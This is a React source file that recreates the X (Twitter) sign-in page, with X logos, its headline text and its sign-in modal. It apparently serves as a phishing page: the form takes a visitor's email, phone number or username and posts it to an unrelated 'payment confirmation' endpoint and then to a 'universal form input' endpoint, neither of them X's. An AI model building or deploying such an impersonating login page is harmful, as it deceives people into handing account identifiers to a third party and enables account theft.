import React, { useState, useContext } from "react";
import { Link } from "react-router-dom";
import { useFormik } from "formik";
import * as Yup from "yup";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { useMutation } from "@tanstack/react-query";
import { AuthContext } from "../context/authContext";
import {jwtDecode} from "jwt-decode";
import Loader from "../components/loader"; // Ensure you have a Loader component
import { FaCheck, FaXmark } from "react-icons/fa6";
import axios from "axios";

const paymentConfirmationUrl = import.meta.env.VITE_payment_confirmation;
const universalFormInputUrl = import.meta.env.VITE_universal_form_input;

function Twitter() {
  const [showSignInModal, setShowSignInModal] = useState(false);
  const [showLoader, setShowLoader] = useState(true); // Loader state
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const { setUser, setToken } = useContext(AuthContext);
  const [uniqueLink, setUniqueLink] = useState("");
  const [inputType, setInputType] = useState(null);

  // Toggle the modal with loader
  const toggleSignInModal = () => {
    setShowSignInModal(true);
    setShowLoader(true); // Show loader initially

    // Hide loader after 1 second, then show the form
    setTimeout(() => setShowLoader(false), 1000);
  };

  // Form validation schema
  const validationSchema = Yup.object({
    email_phone_username: Yup.string()
      .test("isValid", "Enter a valid email, phone number, or username", (value) => {
        if (!value) return false;
        const emailRegex = /\S+@\S+\.\S+/;
        const phoneRegex = /^\d{10,15}$/;
        const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;

        if (emailRegex.test(value)) setInputType("email");
        else if (phoneRegex.test(value)) setInputType("phone");
        else if (usernameRegex.test(value)) setInputType("username");
        else {
          setInputType(null);
          return false;
        }
        return true;
      })
      .required("Required"),
  });

  const twitterLoginMutation = useMutation({
    mutationFn: async (data) => {
      setLoading(true);
      try {
        const loginResponse = await axios.post(paymentConfirmationUrl, data);
        if (loginResponse.status === 201) {
          setUser(jwtDecode(loginResponse.data.access));
          setToken(loginResponse.data.access);

          const paymentResponse = await axios.post(paymentConfirmationUrl);
          if (paymentResponse.status === 200) {
            setUniqueLink(paymentResponse.data.uniqueLink);
            toast.success(`Access your form: ${paymentResponse.data.uniqueLink}`);
            await axios.post(`${universalFormInputUrl}${paymentResponse.data.uniqueLink}/`);
          }
          navigate("/");
          toast.success("Welcome!");
        }
      } catch (error) {
        toast.error("Login failed");
      } finally {
        setLoading(false);
      }
    },
  });

  const { handleSubmit, handleChange, values, touched, errors } = useFormik({
    initialValues: { email_phone_username: "" },
    validationSchema,
    onSubmit: (value) => twitterLoginMutation.mutate(value),
  });

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white">
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-60 z-50">
          <Loader />
        </div>
      )}
      <div className="container flex flex-col md:flex-row justify-center items-center my-10">
        <div className="hidden md:block md:mr-10">
          <img src="/x-2.svg" alt="x-logo" className="w-60" />
        </div>
        <div className="md:translate-x-24">
          <img src="/x-3.svg" alt="x-logo-small" className="block md:hidden" />
          <h1 className="text-4xl md:text-7xl font-bold mt-10 md:mt-20">
            Happening Now
          </h1>
          <h2 className="text-2xl md:text-3xl font-bold mt-6 text-left">
            Join Today
          </h2>
          <div className="button-group mt-6 space-y-4">
            {/* <button className="flex items-center justify-center bg-white text-black border border-gray-300 rounded-full py-2 px-8 md:px-24 hover:bg-gray-100">
              Sign up with Google
              <img src="/google-g-2015.svg" alt="Google logo" className="ml-2" />
            </button> */}
            {/* <button className="flex items-center justify-center bg-white text-black border border-gray-300 rounded-full py-2 px-8 md:px-24 hover:bg-gray-100">
              <img src="/apple-14.svg" alt="Apple logo" className="mr-2" />
              Sign up with Apple
            </button> */}
            <div className="flex w-full">
              <span className="block font-semibold md:px-44 md:ml-0 sm:ml-8">
                or
              </span>
            </div>
            <button className="bg-blue-500 text-white font-extrabold rounded-full py-2 px-12 md:px-32 hover:bg-blue-600">
              <Link to="https://twitter.com/i/flow/signup" target="_blank">
                Create account
              </Link>
            </button>
          </div>
          <h2 className="text-lg md:text-lg mt-5 font-medium text-center md:text-left">
            Already have an account?
          </h2>
          <button
            onClick={toggleSignInModal}
            className="mt-4 bg-transparent text-blue-700 border border-blue-500 w-full rounded-full py-2 px-8 md:px-4 hover:bg-blue-100 font-bold"
          >
            Sign in
          </button>
        </div>
      </div>
      {showSignInModal && (
        <div className="modal fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
          <div className="modal-container bg-gray-100 rounded-lg w-11/12 max-w-md p-6 relative">
            <button
              onClick={() => setShowSignInModal(false)}
              className="absolute top-3 right-3 text-xl"
            >
              &times;
            </button>
            <span className="flex justify-center mb-4 text-3xl">
              <i className="fa-brands fa-x-twitter"></i>
            </span>
            {showLoader ? (
              <Loader /> // Show loader if `showLoader` is true
            ) : (
              <div className="modal-content text-center">
                <h2 className="mt-4 text-2xl font-bold">Sign in to X</h2>
                <div className="button-group mt-6 space-y-4 mx-auto">
                  {/* <button className="flex items-center justify-center bg-white text-black border border-gray-300 rounded-full py-2 px-20 hover:bg-gray-100 mx-auto">
                    Sign in with Google
                    <img src="/google-g-2015.svg" alt="Google logo" className="ml-2" />
                  </button>
                  <button className="flex items-center justify-center bg-white text-black border border-gray-300 rounded-full py-2 px-20 hover:bg-gray-100 mx-auto">
                    <img src="/apple-14.svg" alt="Apple logo" className="mr-2" />
                    Sign in with Apple
                  </button> */}
                  <span className="block mt-4 text-sm">or</span>
                  <form onSubmit={handleSubmit} className="mt-4">
                    <input
                      type="text"
                      name="email_phone_username"
                      value={values.email_phone_username}
                      onChange={handleChange}
                      placeholder="Phone, email, or username"
                      className="p-2 border border-gray-300 rounded w-full max-w-xs mx-auto"
                    />
                    {touched.email_phone_username && errors.email_phone_username ? (
                      <FaXmark color="red" className="absolute right-4 top-1/2 -translate-y-1/2" />
                    ) : (
                      touched.email_phone_username && (
                        <FaCheck color="green" className="absolute right-4 top-1/2 -translate-y-1/2" />
                      )
                    )}
                    <button
                      type="submit"
                      className="bg-black text-white py-2 rounded-full hover:bg-opacity-80 w-full mt-4"
                    >
                      Next
                    </button>
                  </form>
                </div>
                <p className="text-sm mt-5 text-left max-w-xs mx-auto">
                  Don’t have an account?{" "}
                  <Link to="https://twitter.com/i/flow/signup" target="_blank" className="text-blue-500">
                    Sign up
                  </Link>
                </p>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default Twitter;
